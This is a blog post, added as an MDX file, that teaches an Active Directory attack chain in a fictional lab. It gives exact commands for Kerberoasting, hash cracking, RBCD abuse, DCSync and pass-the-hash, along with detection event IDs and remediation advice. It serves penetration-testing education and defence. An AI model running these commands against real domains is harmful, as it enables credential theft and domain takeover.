@@ -1,0 +1,243 @@
+---
+title: "Active Directory Attack Paths: From Foothold to Domain Admin"
+publishedAt: "2026-04-12"
+summary: "A practical walk through a realistic Active Directory compromise — Kerberoasting, NTLM relay, ACL abuse, and DCSync — with BloodHound-style diagrams, the exact commands I run, and the detection signal each step generates."
+tags: "Active Directory, Red Team, OSCP, Kerberos"
+---
+
+Most internal pentests don't end with a CVE. They end with **someone forgot to fix the GPO** five years ago, and the path from a low-priv domain user to Domain Admin is six hops long. This post walks the most common path I see in production environments — from initial foothold through DCSync — with the exact commands, the diagrams I draw on a whiteboard, and the noise each step makes on a SOC dashboard.
+
+The commands here are the ones I run on real engagements. The targets are fictional but the pattern is real.
+
+<KillChain steps={[
+  { label: "Foothold", tool: "phishing / weak svc" },
+  { label: "Recon", tool: "BloodHound" },
+  { label: "Kerberoast", tool: "GetUserSPNs.py" },
+  { label: "Relay / ACL", tool: "ntlmrelayx" },
+  { label: "DCSync", tool: "secretsdump.py" },
+  { label: "Domain Admin", tool: "psexec.py" },
+]} />
+
+## The lab
+
+Three boxes, one domain (`corp.local`), one cup of coffee:
+
+<Terminal title="lab/topology">
+{`DC01.corp.local      10.10.10.10   Windows Server 2019 (DC, GC)
+SRV-FILE01           10.10.10.20   Windows Server 2019 (SMB, MSSQL)
+WS-DEV05             10.10.10.50   Windows 10  (dev workstation)
+
+# our user (initial foothold)
+corp\\jdoe : Summer2024!`}
+</Terminal>
+
+We'll assume `jdoe` is a regular domain user. No local admin anywhere. No GPO push. We're going to walk out as `Domain Admins`.
+
+## Step 1 — Recon with BloodHound
+
+Before I touch a single exploit I want to know **the shape of the domain**. BloodHound is a graph database that ingests AD objects + ACLs and lets me ask questions like *"what's the shortest path from jdoe to Domain Admins?"*.
+
+I collect with `SharpHound` running as `jdoe`:
+
+```bash
+# from a Windows-flavoured shell on WS-DEV05
+SharpHound.exe -c All --zipfilename loot.zip
+```
+
+Drop `loot.zip` into the BloodHound UI and run the canned query **"Shortest paths from owned principals to Domain Admins"**. Below is the kind of graph you typically get on a real network — hand-drawn equivalent:
+
+<Diagram num="1" caption="Shortest path from a foothold user to Domain Admins. Each edge is a privilege the operator can abuse.">
+  <svg viewBox="0 0 720 260" width="100%" style={{ maxWidth: 720, color: "var(--ink)" }} xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+        <path d="M0,0 L10,5 L0,10 Z" fill="var(--accent)" />
+      </marker>
+    </defs>
+    <g fontFamily="Newsreader, Georgia, serif" fontSize="12">
+      <rect x="20" y="100" width="120" height="50" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="80" y="124" fill="currentColor" textAnchor="middle" fontWeight="600">jdoe</text>
+      <text x="80" y="140" fill="#8A7E6C" textAnchor="middle" fontSize="10" fontStyle="italic">Domain User</text>
+
+      <rect x="200" y="100" width="120" height="50" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="260" y="120" fill="currentColor" textAnchor="middle" fontWeight="600">SVC_SQL</text>
+      <text x="260" y="136" fill="var(--accent)" textAnchor="middle" fontSize="10" fontStyle="italic">SPN exposed</text>
+
+      <rect x="380" y="40" width="140" height="50" fill="var(--paper)" stroke="var(--accent-2)" strokeWidth="1.2" />
+      <text x="450" y="60" fill="currentColor" textAnchor="middle" fontWeight="600">helpdesk</text>
+      <text x="450" y="76" fill="var(--accent-2)" textAnchor="middle" fontSize="10" fontStyle="italic">GenericWrite → ws-dev05$</text>
+
+      <rect x="380" y="160" width="140" height="50" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="450" y="180" fill="currentColor" textAnchor="middle" fontWeight="600">backup_ops</text>
+      <text x="450" y="196" fill="var(--accent)" textAnchor="middle" fontSize="10" fontStyle="italic">DCSync rights</text>
+
+      <rect x="580" y="100" width="120" height="50" fill="var(--paper)" stroke="var(--accent)" strokeWidth="1.6" />
+      <text x="640" y="124" fill="var(--accent)" textAnchor="middle" fontWeight="700">DOMAIN ADMINS</text>
+      <text x="640" y="140" fill="var(--accent)" textAnchor="middle" fontSize="10" fontStyle="italic">krbtgt hash</text>
+
+      <line x1="140" y1="125" x2="198" y2="125" stroke="var(--accent)" strokeWidth="1.2" markerEnd="url(#arr)" />
+      <text x="170" y="118" fill="var(--accent)" textAnchor="middle" fontSize="10" fontStyle="italic">Kerberoast</text>
+
+      <line x1="320" y1="115" x2="378" y2="65" stroke="var(--accent-2)" strokeWidth="1.2" markerEnd="url(#arr)" />
+      <line x1="320" y1="135" x2="378" y2="185" stroke="currentColor" strokeWidth="1.1" markerEnd="url(#arr)" />
+
+      <line x1="520" y1="65" x2="598" y2="105" stroke="var(--accent-2)" strokeWidth="1.2" markerEnd="url(#arr)" />
+      <line x1="520" y1="185" x2="598" y2="145" stroke="var(--accent)" strokeWidth="1.4" markerEnd="url(#arr)" />
+      <text x="560" y="140" fill="var(--accent)" textAnchor="middle" fontSize="10" fontStyle="italic">DCSync</text>
+    </g>
+  </svg>
+</Diagram>
+
+Two viable paths jump out: a Kerberoastable service account `SVC_SQL` that's a member of `helpdesk`, and a `backup_ops` group with `DCSync` rights. Either gets us the win — let's chase **both** so we have redundancy.
+
+## Step 2 — Kerberoasting `SVC_SQL`
+
+Any authenticated domain user can request a Kerberos service ticket for any account with an SPN. The TGS is encrypted with the service account's NTLM hash — which means we can crack it offline.
+
+```bash
+# from Linux, with valid creds
+impacket-GetUserSPNs corp.local/jdoe:'Summer2024!' \
+    -dc-ip 10.10.10.10 -request -outputfile spns.txt
+```
+
+A clean `spns.txt` looks like this:
+
+<Terminal title="impacket@kali">
+{`$krb5tgs$23$*SVC_SQL$CORP.LOCAL$MSSQLSvc/srv-file01.corp.local~1433*$
+  a91f2c... [snipped 1.2KB of hash] ...e88f`}
+</Terminal>
+
+Then crack with hashcat. On a single RTX 3070 you're getting roughly 1.4 GH/s on mode 13100 — most reused passwords fall in seconds:
+
+```bash
+hashcat -m 13100 spns.txt rockyou.txt -r rules/best64.rule
+```
+
+> The hash mode is **13100**, not 18200. 18200 is for AS-REP roasting (no pre-auth), which is the next thing to try if Kerberoasting fails.
+
+Result: `SVC_SQL : MSSQL2019!`. We now have a second account, and `helpdesk` membership.
+
+### Detection signal
+
+This generates **Event ID 4769** on the DC for every TGS we request. Any blue team running a "TGS request volume per user" detection will see jdoe spike. The trick most red teamers miss: only Kerberoast *the accounts you actually need* — don't spray.
+
+## Step 3 — Lateral via ACL abuse (`GenericWrite`)
+
+`helpdesk` has `GenericWrite` over `WS-DEV05$`. That doesn't sound like much — but `GenericWrite` lets us set `msDS-AllowedToActOnBehalfOfOtherIdentity`, enabling **resource-based constrained delegation (RBCD)**.
+
+The idea: we add a *fake computer account* to AD (any domain user can do this — `MachineAccountQuota = 10` by default), then tell `WS-DEV05$` it can be impersonated *to itself* by our fake. Then we ask Kerberos for a ticket as `Administrator` on `WS-DEV05$`.
+
+```bash
+# create the attacker-controlled computer
+impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Pwn3d!' \
+    -dc-host DC01.corp.local 'corp.local/SVC_SQL:MSSQL2019!'
+
+# write the RBCD attribute
+impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'WS-DEV05$' \
+    -dc-ip 10.10.10.10 -action write 'corp.local/SVC_SQL:MSSQL2019!'
+
+# request a ticket as Administrator on the box
+impacket-getST -spn 'cifs/ws-dev05.corp.local' \
+    -impersonate Administrator \
+    -dc-ip 10.10.10.10 'corp.local/EVIL$:Pwn3d!'
+
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass ws-dev05.corp.local
+```
+
+That's a SYSTEM shell on `WS-DEV05`. Dump LSASS, harvest credentials cached on the box, look for what other accounts have logged in here.
+
+<Diagram num="2" caption="Resource-based constrained delegation via GenericWrite. The attacker-owned EVIL$ acts as a synthetic 'middle-man' service.">
+  <svg viewBox="0 0 720 220" width="100%" style={{ maxWidth: 720, color: "var(--ink)" }} xmlns="http://www.w3.org/2000/svg">
+    <defs>
+      <marker id="arr2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+        <path d="M0,0 L10,5 L0,10 Z" fill="var(--accent)" />
+      </marker>
+    </defs>
+    <g fontFamily="Newsreader, Georgia, serif" fontSize="12">
+      <rect x="20" y="80" width="140" height="50" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="90" y="100" fill="currentColor" textAnchor="middle" fontWeight="600">SVC_SQL</text>
+      <text x="90" y="116" fill="#8A7E6C" textAnchor="middle" fontSize="10" fontStyle="italic">helpdesk member</text>
+
+      <rect x="220" y="20" width="160" height="50" fill="var(--paper)" stroke="var(--accent-2)" strokeWidth="1.2" strokeDasharray="4 3" />
+      <text x="300" y="40" fill="currentColor" textAnchor="middle" fontWeight="600">EVIL$ (synth)</text>
+      <text x="300" y="56" fill="var(--accent-2)" textAnchor="middle" fontSize="10" fontStyle="italic">created via MAQ</text>
+
+      <rect x="220" y="140" width="160" height="50" fill="var(--paper)" stroke="currentColor" strokeWidth="1.2" />
+      <text x="300" y="160" fill="currentColor" textAnchor="middle" fontWeight="600">WS-DEV05$</text>
+      <text x="300" y="176" fill="var(--accent)" textAnchor="middle" fontSize="10" fontStyle="italic">RBCD attr written</text>
+
+      <rect x="450" y="80" width="160" height="50" fill="var(--paper)" stroke="var(--accent)" strokeWidth="1.6" />
+      <text x="530" y="100" fill="var(--accent)" textAnchor="middle" fontWeight="700">SYSTEM @ WS-DEV05</text>
+      <text x="530" y="116" fill="var(--accent)" textAnchor="middle" fontSize="10" fontStyle="italic">impersonate Administrator</text>
+
+      <line x1="160" y1="105" x2="218" y2="50" stroke="var(--accent-2)" strokeWidth="1.2" markerEnd="url(#arr2)" />
+      <line x1="160" y1="115" x2="218" y2="160" stroke="currentColor" strokeWidth="1.1" markerEnd="url(#arr2)" />
+      <line x1="380" y1="160" x2="453" y2="115" stroke="currentColor" strokeWidth="1.1" markerEnd="url(#arr2)" />
+      <line x1="380" y1="50" x2="453" y2="100" stroke="var(--accent-2)" strokeWidth="1.2" markerEnd="url(#arr2)" />
+    </g>
+  </svg>
+</Diagram>
+
+### Detection signal
+
+`addcomputer` writes a new computer account → **Event 4741**. RBCD writes touch `msDS-AllowedToActOnBehalfOfOtherIdentity` — auditing on that attribute is the single best AD detection you can deploy and almost nobody does.
+
+## Step 4 — DCSync via `backup_ops`
+
+Honestly? At this point I've already won. But for completeness — `backup_ops` was the second path BloodHound flagged. Members of that group have `Replicating Directory Changes` and `Replicating Directory Changes All`. That equals DCSync.
+
+Imagine LSASS on `WS-DEV05` gave us cached creds for `bgreen` (a backup_ops member):
+
+```bash
+impacket-secretsdump -just-dc 'corp.local/bgreen:Backup#22'@10.10.10.10
+```
+
+Output (truncated):
+
+<Terminal title="secretsdump@kali">
+{`Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:9a8c3...
+[*] Cleaning up...`}
+</Terminal>
+
+That's the `krbtgt` hash. Game over — golden tickets, persistence, the full menu.
+
+## Step 5 — Pass-the-hash to Domain Admin
+
+```bash
+impacket-psexec -hashes :7facdc498ed1680c4fd1448319a8c04f \
+    'corp.local/Administrator'@10.10.10.10
+```
+
+`nt authority\system` on the DC. Take screenshots. Write the report.
+
+## What the report actually says
+
+The findings I file aren't *"we got DA"* — those are **outcomes**, not findings. The findings are:
+
+- `SVC_SQL` has a 12-char password and a SPN. Rotate. Use a gMSA going forward.
+- `helpdesk` has `GenericWrite` over endpoints it doesn't need. Tier them out.
+- `MachineAccountQuota` is 10. Set it to 0 unless you have a specific reason.
+- `backup_ops` has DCSync rights nobody documented. Audit who's in it.
+
+Each of those is independently fixable. Each one alone breaks at least one step of the chain. **Defense in depth means none of this works in isolation.**
+
+## TL;DR cheatsheet
+
+<Table
+  data={{
+    headers: ["Step", "Tool", "Detection ID"],
+    rows: [
+      ["Recon", "SharpHound / BloodHound", "4662 (heavy LDAP)"],
+      ["Kerberoast", "GetUserSPNs.py", "4769"],
+      ["RBCD setup", "addcomputer + rbcd.py", "4741, 5136"],
+      ["Ticket request", "getST.py", "4768/4769"],
+      ["Lateral exec", "psexec.py", "4624 type 3, 7045"],
+      ["DCSync", "secretsdump.py", "4662 + replication GUIDs"],
+    ],
+  }}
+/>
+
+Want the next post in this series? I'm planning a deep-dive on **kerberos delegation gone wrong** — unconstrained, constrained, and the RBCD pattern above — with the exact ticket flows side-by-side. Subscribe to the [RSS feed](/rss.xml).
